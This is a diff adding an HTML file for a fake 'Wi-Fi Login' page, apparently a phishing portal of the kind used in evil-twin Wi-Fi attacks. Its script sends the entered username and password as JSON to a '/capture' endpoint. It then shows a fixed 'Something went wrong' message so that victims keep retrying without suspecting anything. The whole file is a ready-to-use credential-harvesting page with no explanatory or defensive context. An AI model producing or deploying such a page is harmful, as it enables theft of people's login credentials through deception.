@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Wi-Fi Login</title>
+  <style>
+    body {
+      background: #f0f2f5;
+      font-family: Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-box {
+      background: white;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 8px 16px rgba(0,0,0,0.1);
+      text-align: center;
+      width: 300px;
+    }
+    .login-box h2 {
+      margin-bottom: 20px;
+      color: #333;
+    }
+    .login-box input[type="text"],
+    .login-box input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+    }
+    .login-box button {
+      background: #007bff;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 8px;
+      cursor: pointer;
+      width: 100%;
+    }
+    .login-box button:hover {
+      background: #0056b3;
+    }
+    .login-box .footer {
+      margin-top: 15px;
+      font-size: 12px;
+      color: #777;
+    }
+    .status-message {
+      margin-top: 10px;
+      color: red;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <h2>Wi-Fi Login</h2>
+    <input type="text" id="username" placeholder="Username" required />
+    <input type="password" id="password" placeholder="Password" required />
+    <button onclick="sendCredentials()">Login</button>
+    <div id="statusmessage" class="status-message"></div>
+    <div class="footer">By logging in, you accept our terms and conditions.</div>
+  </div>
+
+  <script>
+    function sendCredentials() {
+      let username = document.getElementById("username").value;
+      let password = document.getElementById("password").value;
+      let statusMessage = document.getElementById("statusmessage");
+
+      // Clear previous messages
+      statusMessage.innerHTML = "";
+
+      if (username === "" || password === "") {
+        statusMessage.innerHTML = "Please enter both username and password.";
+        return;
+      }
+
+      fetch("/capture", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ username: username, password: password })
+      })
+      .then(response => response.text())
+      .then(data => {
+        statusMessage.innerHTML = "Something went wrong. Please try again.";
+      })
+      .catch(error => {
+        console.error("Error:", error);
+        statusMessage.innerHTML = "Error submitting credentials.";
+      });
+    }
+  </script>
+</body>
+</html>
